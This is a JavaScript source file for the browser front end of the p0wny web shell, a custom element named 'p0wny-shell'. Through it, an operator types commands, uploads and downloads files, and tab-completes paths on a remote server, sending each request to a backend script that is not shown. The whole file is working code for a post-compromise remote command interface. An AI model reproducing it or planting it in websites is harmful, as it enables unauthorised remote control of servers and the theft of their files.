class P0wnyShell extends HTMLElement {

    cwd = null;
    commandHistory = [];
    historyPosition = 0;

    userName = 'p0wny';
    hostName = 'shell';

    backend = '';

    eRoot = null;
    eShellCmdInput = null;
    eShellContent = null;
    eShellPrompt = null;

    /**
     * Constructor
     *
     * Creates the shadow root and attaches the event listeners
     */
    constructor() {
        super();

        // get the base path of the current script
        const base = document.currentScript.src.substring(0,document.currentScript.src.lastIndexOf('/')+1);

        this.eRoot = this.attachShadow({mode: 'open'});
        this.eRoot.innerHTML = `
            <link rel="stylesheet" href="${base}P0wnyShell.css" type="text/css" />
            <div id="shell">
                <pre id="shell-content">
                    <div id="shell-logo"><div><slot></slot></div></div>
                </pre>
                <div id="shell-input">
                    <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
                    <div>
                        <input id="shell-cmd" name="cmd" />
                    </div>
                </div>
            </div>
        `;

        this.eShellCmdInput = this.eRoot.querySelector('#shell-cmd');
        this.eShellContent = this.eRoot.querySelector('#shell-content');
        this.eShellPrompt = this.eRoot.querySelector('#shell-prompt');
        this.eShellCmdInput.addEventListener('keydown', this.onShellCmdKeyDown.bind(this));

        // click into the shell to focus the input (unless selecting)
        this.eRoot.addEventListener('click', function (event) {
            const selection = window.getSelection();
            if (!selection.toString()) {
                this.eShellCmdInput.focus();
            }
        }.bind(this));
    }

    /**
     * Called when the shadow DOM has been attached to the element
     */
    connectedCallback() {
        this.userName = this.getAttribute('username') || this.userName;
        this.hostName = this.getAttribute('hostname') || this.hostName;
        this.backend = this.getAttribute('backend') || this.backend;
        this.cwd = this.getAttribute('cwd');

        this.updateCwd(this.cwd);
        this.eShellCmdInput.focus();

        // fetch real username and hostname from backend
        this.makeRequest('?feature=userhost', {cwd: this.cwd}, function (response) {
            this.userName = response.username ? atob(response.username) : this.userName;
            this.hostName = response.hostname ? atob(response.hostname) : this.hostName;
            this.updateCwd(atob(response.cwd));
        }.bind(this));
    }

    /**
     * Add a new command to the shown shell
     *
     * @param {string} command
     */
    insertCommand(command) {
        this.eShellContent.innerHTML += "\n\n";

        const promptSpan = document.createElement('span');
        promptSpan.classList.add('shell-prompt');
        this.updatePrompt(this.cwd, promptSpan);
        this.eShellContent.appendChild(promptSpan);

        const commandSpan = document.createElement('span');
        commandSpan.textContent = command;
        this.eShellContent.appendChild(commandSpan);

        this.eShellContent.innerHTML += "\n";
        this.eShellContent.scrollTop = this.eShellContent.scrollHeight;
    }

    /**
     * Add command output to the shown shell
     *
     * @param {string} stdout
     */
    insertStdout(stdout) {
        const textElem = document.createTextNode(stdout);
        this.eShellContent.appendChild(textElem);
        this.eShellContent.scrollTop = this.eShellContent.scrollHeight;
    }

    /**
     * Simple method to decouple a given callback from the main thread
     *
     * @param {function} callback
     */
    defer(callback) {
        setTimeout(callback, 0);
    }

    /**
     * Handle an entered shell command
     *
     * Commands may be executed directly or passed to the backend
     *
     * @param command
     */
    featureShell(command) {
        this.insertCommand(command);

        if (/^\s*upload\s+\S+\s*$/.test(command)) {
            // pass to upload feature
            this.featureUpload(command.match(/^\s*upload\s+(\S+)\s*$/)[1]);
        } else if (/^\s*clear\s*$/.test(command)) {
            // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
            this.eShellContent.innerHTML = '';
        } else {
            // send to backend
            this.makeRequest("?feature=shell", {cmd: command, cwd: this.cwd}, function (response) {
                if (response.hasOwnProperty('file')) {
                    this.featureDownload(atob(response.name), response.file)
                } else {
                    this.insertStdout(atob(response.stdout));
                    this.updateCwd(atob(response.cwd));
                }
            }.bind(this));
        }
    }

    /**
     * Handle tab auto completion
     */
    featureHint() {
        if (this.eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete


        const currentCmd = this.eShellCmdInput.value.split(" ");
        const type = (currentCmd.length === 1) ? "cmd" : "file";
        const fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];

        this.makeRequest(
            "?feature=hint",
            {
                filename: fileName,
                cwd: this.cwd,
                type: type
            },
            function (data) {
                if (data.files.length <= 1) return;  // no completion
                data.files = data.files.map(function (file) {
                    return atob(file);
                });
                if (data.files.length === 2) {
                    if (type === 'cmd') {
                        self.eShellCmdInput.value = data.files[0];
                    } else {
                        const currentValue = this.eShellCmdInput.value;
                        this.eShellCmdInput.value = currentValue.replace(/(\S*)$/, data.files[0]);
                    }
                } else {
                    this.insertCommand(this.eShellCmdInput.value);
                    this.insertStdout(data.files.join("\n"));
                }
            }.bind(this)
        );

    }

    /**
     * Make the browser download a file using a data URI
     *
     * @param {string} name Name of the file to download
     * @param {string} file Base64 encoded file content
     */
    featureDownload(name, file) {
        const element = document.createElement('a');
        element.setAttribute('href', 'data:application/octet-stream;base64,' + file);
        element.setAttribute('download', name);
        element.style.display = 'none';

        this.eRoot.appendChild(element);
        element.click();
        this.eRoot.removeChild(element);
        this.insertStdout('Done.');
    }

    /**
     * Upload a file to the server
     *
     * @todo use await/async
     * @param {string} path Path to upload the file to (relative to current working directory)
     */
    featureUpload(path) {
        const element = document.createElement('input');
        element.setAttribute('type', 'file');
        element.style.display = 'none';
        document.body.appendChild(element);
        element.addEventListener('change', function () {
            const promise = this.getBase64(element.files[0]);
            promise.then(
                function (file) {
                    this.makeRequest(
                        '?feature=upload',
                        {path: path, file: file, cwd: this.cwd},
                        function (response) {
                            this.insertStdout(atob(response.stdout));
                            this.updateCwd(atob(response.cwd));
                        }.bind(this)
                    );
                }.bind(this),
                function () {
                    this.insertStdout('An unknown client-side error occurred.');
                }.bind(this)
            );
        }.bind(this));
        element.click();
        document.body.removeChild(element);
    }

    /**
     * Get the base64 representation of a file
     *
     * @todo make async instead of promise
     * @param file
     * @returns {Promise<unknown>}
     */
    getBase64(file) {

        return new Promise(function (resolve, reject) {
            const reader = new FileReader();
            reader.onload = function () {
                resolve(reader.result.match(/base64,(.*)$/)[1]);
            };
            reader.onerror = reject;
            reader.readAsDataURL(file);
        });
    }

    /**
     * Update the current working directory
     *
     * @param {string|null} cwd
     */
    updateCwd(cwd = null) {
        if (cwd) {
            this.cwd = cwd;
            this.updatePrompt();
            return;
        }
        this.makeRequest("?feature=pwd", {}, function (response) {
            this.cwd = atob(response.cwd);
            this.updatePrompt();
        }.bind(this));
    }

    /**
     * Update the prompt
     *
     * @param {string|null} cwd The current working directory, defaults to current one
     * @param {HTMLElement|null} element The element holding the prompt, defaults to input prompt
     */
    updatePrompt(cwd = null, element = null) {
        cwd = cwd || this.cwd || "~";
        element = element || this.eShellPrompt;

        // create a short version of the current working directory
        let shortCwd = cwd;
        if (cwd.split("/").length > 3) {
            const splittedCwd = cwd.split("/");
            shortCwd = "…/" + splittedCwd[splittedCwd.length - 2] + "/" + splittedCwd[splittedCwd.length - 1];
        }

        // create the prompt elements
        const userText = document.createTextNode(this.userName + "@" + this.hostName + ":");
        const cwdSpan = document.createElement("span");
        cwdSpan.title = cwd;
        cwdSpan.textContent = shortCwd;
        const promptText = document.createTextNode("# ");

        // clear the prompt and add the elements
        element.innerHTML = '';
        element.appendChild(userText);
        element.appendChild(cwdSpan);
        element.appendChild(promptText);
    }

    /**
     * Handle keydown event on shell command input
     *
     * @param {KeyboardEvent} event
     */
    onShellCmdKeyDown(event) {
        switch (event.key) {
            case "Enter":
                this.featureShell(this.eShellCmdInput.value);
                this.insertToHistory(this.eShellCmdInput.value);
                this.eShellCmdInput.value = "";
                break;
            case "ArrowUp":
                if (this.historyPosition > 0) {
                    this.historyPosition--;
                    this.eShellCmdInput.blur();
                    this.eShellCmdInput.value = this.commandHistory[this.historyPosition];
                    this.defer(function () {
                        this.eShellCmdInput.focus();
                    }.bind(this));
                }
                break;
            case "ArrowDown":
                if (this.historyPosition >= this.commandHistory.length) {
                    break;
                }
                this.historyPosition++;
                if (this.historyPosition === this.commandHistory.length) {
                    this.eShellCmdInput.value = "";
                } else {
                    this.eShellCmdInput.blur();
                    this.eShellCmdInput.focus();
                    this.eShellCmdInput.value = this.commandHistory[this.historyPosition];
                }
                break;
            case 'Tab':
                event.preventDefault();
                this.featureHint();
                break;
        }
    }

    /**
     * Insert command to history
     *
     * @param {string} cmd
     */
    insertToHistory(cmd) {
        this.commandHistory.push(cmd);
        this.historyPosition = this.commandHistory.length;
    }

    /**
     * Send a request to the backend
     *
     * @todo use fetch instead of XMLHttpRequest
     * @param {string} url base url
     * @param {object} params An object containing the parameters to send
     * @param {function} callback A callback function to call when the request is done
     */
    makeRequest(url, params, callback) {
        function getQueryString() {
            const a = [];
            for (const key in params) {
                if (params.hasOwnProperty(key)) {
                    a.push(encodeURIComponent(key) + "=" + encodeURIComponent(params[key]));
                }
            }
            return a.join("&");
        }

        const xhr = new XMLHttpRequest();
        xhr.open("POST", this.backend + url, true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4 && xhr.status === 200) {
                try {
                    const responseJson = JSON.parse(xhr.responseText);
                    callback(responseJson);
                } catch (error) {
                    alert("Error while parsing response: " + error);
                }
            }
        };
        xhr.send(getQueryString());
    }


}

window.customElements.define('p0wny-shell', P0wnyShell);
